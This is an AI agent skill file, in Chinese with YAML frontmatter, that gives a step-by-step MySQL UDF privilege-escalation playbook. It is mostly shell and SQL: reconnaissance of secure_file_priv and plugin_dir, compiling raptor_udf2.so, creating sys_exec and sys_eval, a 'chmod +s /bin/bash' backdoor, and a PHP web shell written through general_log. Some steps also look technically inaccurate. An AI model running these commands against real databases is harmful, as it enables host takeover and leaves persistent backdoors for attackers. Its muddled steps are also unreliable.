---
name: 'mysql-udf-privesc'
description: 'MySQL root → UDF shared library → SYSTEM命令执行。Linux最常见的数据库提权路径之一。'
disable-model-invocation: true
metadata: { domain: db, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## MySQL UDF (User Defined Function) 提权

> MySQL root 权限 → 加载自定义共享库 → 以 mysql 用户（或 root）执行系统命令

### 检测
```bash
# MySQL 是否以 root 运行
ps aux | grep mysql | grep -v grep
# 检查 secure_file_priv（空 = 可写任意路径）
mysql -u root -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# 检查 plugin 目录
mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
# 版本 → 选择对应架构的 .so
mysql -u root -p -e "SELECT @@version_compile_os, @@version_compile_machine;"
```

### UDF 库准备
```bash
# Kali: 编译 raptor_udf2.c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 或者使用预编译的（Kali 自带）
cp /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so .
# 或者
searchsploit -m 1518   # raptor_udf2.c
```

### 利用
```sql
-- 1. 写 so 到 plugin 目录
SELECT hex(LOAD_FILE('/tmp/raptor_udf2.so')) INTO DUMPFILE '/tmp/raptor.hex';
-- 或者通过 INSERT + SELECT INTO DUMPFILE 写二进制

-- 2. 创建函数
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- 3. 执行命令
SELECT sys_exec('chmod +s /bin/bash');
SELECT sys_eval('id');

-- 4. （可选）清理
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
```

### 如果 secure_file_priv 非空
```sql
-- 写文件到允许的路径
SELECT @@secure_file_priv;   -- 如 /var/lib/mysql-files/
-- 改 plugin_dir
SET GLOBAL plugin_dir = '/var/lib/mysql-files/';
-- 或者用 general_log 写文件（需要 FILE 权限）
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = ON;
SELECT '<?php system($_GET["c"]);?>';
SET GLOBAL general_log = OFF;
```

### 版本注意事项
- MySQL < 5.0.67: 直接 SYSTEM 权限
- MySQL >= 5.0.67: UDF 仍然以 mysql 用户运行，需要额外提权
- MariaDB: 大多数版本仍支持，但新版限制了 `plugin_dir` 修改
